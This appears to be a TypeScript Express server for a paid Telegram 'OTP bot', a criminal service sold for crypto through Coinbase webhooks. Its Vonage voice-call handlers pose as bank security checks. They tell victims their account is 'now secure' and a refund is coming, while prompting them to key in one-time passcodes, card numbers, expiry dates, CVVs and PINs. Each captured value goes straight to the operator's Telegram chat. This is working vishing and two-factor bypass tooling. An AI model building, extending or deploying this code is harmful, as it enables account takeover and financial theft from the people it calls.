/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
import { Webhook } from 'coinbase-commerce-node';
import express from 'express';
import moment from 'moment';
import { Markup } from 'telegraf';
import { bot } from '.';
import { client } from './utils/contentful';
import { accountFlow, bankFlow, cardFlow, payFlow } from './utils/dtmfFlow';
import { getUser } from './utils/getUser';

const app = express();

app.use(express.json());
app.use(
  express.urlencoded({
    extended: true,
  }),
);

app.post('/coinbase-webhook', async (req, res) => {
  const body = req.body;
  const signature = req.headers['x-cc-webhook-signature'] as string;
  const webhookSecret = process.env.COINBASE_WEBHOOK_SECRET as string;

  try {
    const event = Webhook.verifyEventBody(
      JSON.stringify(body),
      signature,
      webhookSecret,
    );

    const { metadata } = body.event.data;

    if (event.type === 'charge:pending' && metadata.reason === 'OTP Purchase') {
      // user paid, but transaction not confirm on blockchain yet
      bot.telegram.sendMessage(
        metadata.chatId,
        '😁 Your payment has been received but not confirmed yet ',
      );
    }

    if (
      event.type === 'charge:confirmed' &&
      metadata.reason === 'OTP Purchase'
    ) {
      // all good, charge confirmed
      bot.telegram.sendMessage(
        metadata.chatId,
        '😋 Your payment has been received',
      );
      try {
        const { user } = await getUser({
          id: Number(metadata.chatId),
        });

        if (user) {
          user.fields.membershipExpiry = {
            'en-US': moment.utc().add(1, 'month').format(),
          };

          await user.update();

          return bot.telegram.sendMessage(
            metadata.chatId,
            '🤩 Your subsciption has been renewed, to start send "call"',
          );
        }
      } catch (error) {
        const space = await client.getSpace(
          process.env.CONTENTFUL_SPACE as string,
        );
        const env = await space.getEnvironment('master');
        await env.createEntry('user', {
          fields: {
            id: { 'en-US': Date.now() },
            telegramId: { 'en-US': Number(metadata.chatId) },
            username: { 'en-US': metadata.username },
            membershipExpiry: {
              'en-US': moment.utc().add(1, 'month').format(),
            },
            membershipType: {
              'en-US': 'SILVER',
            },
          },
        });

        return bot.telegram.sendMessage(
          metadata.chatId,
          '🤩 Your subsciption has been confirmed, to start send "call"',
        );
      }
    }

    if (event.type === 'charge:failed' && metadata.reason === 'OTP Purchase') {
      // charge failed or expired
      bot.telegram.sendMessage(
        metadata.chatId,
        "😔 You didn't make a payment if this an error please contact admin",
      );
    }

    return res.json(`success ${event.id}`);
  } catch (error) {
    return res.status(400).json('failure!');
  }
});

app.post('/vonage-webhook/dtmf/:language/:step/:chatId', (req, res) => {
  const { dtmf } = req.body;
  const { step, language, chatId } = req.params;

  const { wallet, askCardInfo, cardType } = req.query;

  switch (step) {
    case 'bank':
      bankFlow(dtmf, res, language, Number(chatId), step);
      break;
    case 'pay':
      payFlow(dtmf, res, language, Number(chatId), step, wallet as string);
      break;
    case 'account':
      accountFlow(
        dtmf,
        res,
        language,
        Number(chatId),
        step,
        askCardInfo as string,
      );
      break;
    case 'card':
      cardFlow(dtmf, res, language, Number(chatId), step, cardType as string);
      break;
    default:
      break;
  }
});

app.post('/vonage-webhook/pin/:chatId/:language', async (req, res) => {
  const { dtmf } = req.body;
  const { chatId, language } = req.params;
  if (dtmf && dtmf.digits === '*') {
    await bot.telegram.sendMessage(
      chatId,
      `OTP not received ❌\n\nCall again`,
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );

    return res.json([
      {
        action: 'talk',
        text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
        style: 2,
        language,
      },
    ]);
  }
  if (dtmf && dtmf.digits) {
    await bot.telegram.sendMessage(
      req.params.chatId,
      req.params.language === 'en-US'
        ? `Card Pin is <b>${dtmf.digits}</b> 💳`
        : `Telepin is <b>${dtmf.digits}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }
  return res.json([
    {
      action: 'talk',
      text: `GREAT, you have entered ${dtmf.digits
        .split('')
        .join(
          ' ',
        )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
      style: 2,
      language: req.params.language,
    },
  ]);
});

app.post('/vonage-webhook/card/:step/:chatId/:language', async (req, res) => {
  const { dtmf } = req.body;
  const { cardType, isAccount, expiry, cvv } = req.query;

  const { language, chatId, step } = req.params;

  if (isAccount === 'yes') {
    if (dtmf && dtmf.digits) {
      await bot.telegram.sendMessage(
        chatId,
        `Card number <b>${dtmf.digits}</b> ✅`,
        {
          parse_mode: 'HTML',
        },
      );
    }
    res.json([
      {
        action: 'talk',
        text: `GREAT, you have entered ${dtmf.digits
          .split('')
          .join(' ')}. Please enter your ${
          cardType !== 'undefined' ? cardType : ''
        } card expirattion date followed by the # key.`,
        style: 2,
        language,
      },
      {
        eventUrl: [
          `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
        ],
        action: 'input',
        type: ['dtmf'],
        dtmf: {
          submitOnHash: true,
          timeOut: 10,
          maxDigits: 6,
        },
      },
    ]);
  }

  if (expiry === 'yes') {
    if (dtmf && dtmf.digits) {
      await bot.telegram.sendMessage(
        chatId,
        `Expiration date <b>${dtmf.digits}</b> ✅`,
        {
          parse_mode: 'HTML',
        },
      );
    }

    return res.json([
      {
        action: 'talk',
        text: `GREAT, you have entered ${dtmf.digits
          .split('')
          .join(' ')}. Please enter your ${
          cardType !== 'undefined' ? cardType : ''
        } card CVV followed by the # key.`,
        style: 2,
        language,
      },
      {
        eventUrl: [
          `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
        ],
        action: 'input',
        type: ['dtmf'],
        dtmf: {
          submitOnHash: true,
          timeOut: 10,
          maxDigits: 6,
        },
      },
    ]);
  }

  if (cvv === 'yes') {
    if (dtmf && dtmf.digits) {
      await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf.digits}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }

    return res.json([
      {
        action: 'talk',
        text: `GREAT. you have entered ${dtmf.digits
          .split('')
          .join(' ')}. To AUTHENTICATE YOU please enter your ${
          language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
        } followed by the # key.`,
        style: 2,
        language,
        bargeIn: true,
      },
      {
        eventUrl: [
          `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
        ],
        action: 'input',
        type: ['dtmf'],
        dtmf: {
          submitOnHash: true,
          timeOut: 10,
          maxDigits: 18,
        },
      },
    ]);
  }
});

app.post('/vonage-webhook/otp/:step/:chatId/:language', async (req, res) => {
  const { dtmf } = req.body;
  const { askCardInfo, cardType } = req.query;
  const { language, chatId, step } = req.params;

  if (dtmf && dtmf.digits === '*') {
    await bot.telegram.sendMessage(
      chatId,
      `OTP not received ❌\n\nCall again`,
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );

    return res.json([
      {
        action: 'talk',
        text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
        style: 2,
        language,
      },
    ]);
  }

  switch (step) {
    case 'bank':
      if (dtmf && dtmf.digits) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf.digits}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }
      return res.json([
        {
          action: 'talk',
          text: `GREAT. you have entered ${dtmf.digits
            .split('')
            .join(' ')}. To AUTHENTICATE YOU please enter your ${
            language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
          } followed by the # key.`,
          style: 2,
          language,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            submitOnHash: true,
            timeOut: 10,
            maxDigits: 18,
          },
        },
      ]);
    case 'pay':
      if (dtmf && dtmf.digits) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf.digits}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }
      return res.json([
        {
          action: 'talk',
          text: `GREAT. you have entered ${dtmf.digits
            .split('')
            .join(' ')}. To AUTHENTICATE YOU please enter your ${
            language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
          } followed by the # key.`,
          style: 2,
          language,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            submitOnHash: true,
            timeOut: 10,
            maxDigits: 18,
          },
        },
      ]);
    case 'account':
      if (dtmf && dtmf.digits) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf.digits}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }

      if (askCardInfo === 'yes') {
        return res.json([
          {
            action: 'talk',
            text: `Okay, you have entered ${dtmf.digits
              .split('')
              .join(' ')}. We need to verify you, please enter your ${
              cardType !== 'undefined' ? cardType : ''
            } card number followed by the # key`,
            style: 2,
            language: language,
            bargeIn: true,
          },
          {
            eventUrl: [
              `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
            ],
            action: 'input',
            type: ['dtmf'],
            dtmf: {
              submitOnHash: true,
              timeOut: 10,
              maxDigits: 18,
            },
          },
        ]);
      } else {
        return res.json([
          {
            action: 'talk',
            text: `GREAT, you have entered ${dtmf.digits
              .split('')
              .join(
                ' ',
              )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            style: 2,
            language,
          },
        ]);
      }
    case 'card':
      if (dtmf && dtmf.digits) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `Card number <b>${dtmf.digits}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }
      return res.json([
        {
          action: 'talk',
          text: `GREAT, you have entered ${dtmf.digits
            .split('')
            .join(
              ' ',
            )}. Please enter your ${cardType} card expiry date followed by the # key.`,
          style: 2,
          language,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}?expiry=yes`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            submitOnHash: true,
            timeOut: 10,
            maxDigits: 6,
          },
        },
      ]);
    default:
      break;
  }
});
app.post('/vonage-webhook/:chatId', async (req, res) => {
  const { chatId } = req.params;
  const { status, to } = req.body;
  if (!chatId) {
    return;
  }

  if (status === 'ringing') {
    await bot.telegram.sendMessage(chatId, `Ringing (${to}) 🔔`);
  }

  if (status === 'answered') {
    await bot.telegram.sendMessage(chatId, `On call (${to}) 🤳🏽`, {
      parse_mode: 'HTML',
    });
  }

  if (status === 'busy') {
    await bot.telegram.sendMessage(
      chatId,
      '<b>On another call </b> ❌\n\nCall again',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );
  }

  if (status === 'machine') {
    await bot.telegram.sendMessage(
      chatId,
      '<b>Voicemail</b> ❌\n\nCall again',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );
  }

  if (status === 'cancelled') {
    await bot.telegram.sendMessage(
      chatId,
      'Call could not be placed, the number is unreachable ❌.',
    );

    await bot.context.scene?.enter('super-wizard');
  }

  if (status === 'rejected' || status === 'declined') {
    await bot.telegram.sendMessage(chatId, '<b>Hung up</b> ❌\n\nCall again', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }

  if (status === 'unanswered' || status === 'timeout') {
    await bot.telegram.sendMessage(
      chatId,
      '<b>No answer</b> ❌\n\nCall again',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );
  }

  if (status === 'failed') {
    await bot.telegram.sendMessage(
      chatId,
      '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('Try again', 'start'),
        ]).reply_markup,
      },
    );

    await bot.context.scene?.enter('super-wizard');
  }
  if (status === 'completed') {
    await bot.telegram.sendMessage(chatId, '<b>Ended.</b>.\n\nCall again? 📞', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }
  // console.log(req.body);
  res.send({});
});

const port = process.env.PORT || 4000;

app.get('/', (_, res) => {
  res.send('Hello World!');
});

app.listen(port, () =>
  // eslint-disable-next-line no-console
  console.log(`⚡⚡⚡ Server has started on http://localhost:${port}`),
);
